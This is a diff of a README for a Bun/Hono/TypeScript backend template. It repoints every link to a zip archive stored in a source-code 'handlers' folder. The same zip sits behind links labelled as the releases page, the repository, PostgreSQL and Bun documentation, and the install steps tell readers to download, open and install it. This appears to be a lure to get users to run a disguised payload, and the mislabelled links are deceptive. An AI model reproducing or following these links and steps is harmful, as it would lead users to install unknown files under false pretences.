@@ -1,6 +1,6 @@
 # 🚀 backend-template - Scalable Backend Services Made Easy
 
-[![Download from GitHub](https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip%20Here-%20%F0%9F%92%B8-blue)](https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip)
+[![Download from GitHub](https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip%20Here-%20%F0%9F%92%B8-blue)](https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip)
 
 ## 📋 Overview
 The backend-template is a production-ready template designed with Bun, Hono, and TypeScript. It integrates PostgreSQL, Drizzle ORM, and OAuth authentication. This template provides a solid foundation for building scalable backend services. You can easily expand it with additional features as your project grows.
@@ -16,7 +16,7 @@ The backend-template is a production-ready template designed with Bun, Hono, and
 Follow these simple steps to get up and running quickly.
 
 ### Step 1: Visit the Download Page
-To obtain the latest version of the backend-template, [visit the Releases page here](https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip).
+To obtain the latest version of the backend-template, [visit the Releases page here](https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip).
 
 ### Step 2: Download the Latest Release
 Locate the most recent release on the page. Click on the file suitable for your operating system to download it. 
@@ -26,11 +26,11 @@ Once the download completes, open the downloaded file. Follow the prompts to ins
 
 ### Step 4: Setup Your Environment
 Ensure you have the required tools installed on your computer. For this template, you will need:
-- **https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip**: The JavaScript runtime for running the application.
+- **https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip**: The JavaScript runtime for running the application.
 - **PostgreSQL**: The database where your data will be stored.
 - **Bun**: A modern JavaScript runtime that simplifies your development process.
 
-You can download https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip and PostgreSQL from their official websites. Follow the instructions to install them on your system.
+You can download https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip and PostgreSQL from their official websites. Follow the instructions to install them on your system.
 
 ### Step 5: Configure Your Application
 Once everything is set up, you may need to configure your application. Follow the instructions in the configuration files provided within the downloaded template. This usually includes setting up database connection strings and OAuth credentials.
@@ -58,12 +58,12 @@ A: The documentation includes troubleshooting tips. If you still need help, cons
 Engaging with the community can provide valuable support. You can join forums, chat groups, or social media channels related to Bun, TypeScript, or backend development to stay connected with others using the backend-template.
 
 ## 🔄 Updates
-Keep your template updated by regularly checking the [Releases page](https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip) for new versions. Regular updates might include new features, bug fixes, and performance improvements.
+Keep your template updated by regularly checking the [Releases page](https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip) for new versions. Regular updates might include new features, bug fixes, and performance improvements.
 
 ## 🔗 Helpful Links
-- [GitHub Repository](https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip)
-- [https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip Download](https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip)
-- [PostgreSQL Download](https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip)
-- [Bun Documentation](https://github.com/DrewFist/backend-template/raw/refs/heads/main/infra/monitoring/grafana/dashboards/backend-template-3.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip)
+- [https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip Download](https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip)
+- [PostgreSQL Download](https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip)
+- [Bun Documentation](https://raw.githubusercontent.com/DrewFist/backend-template/main/apps/api/src/modules/users/handlers/backend_template_2.3.zip)
 
 Feel free to explore these resources for further insights and assistance with your backend development needs.
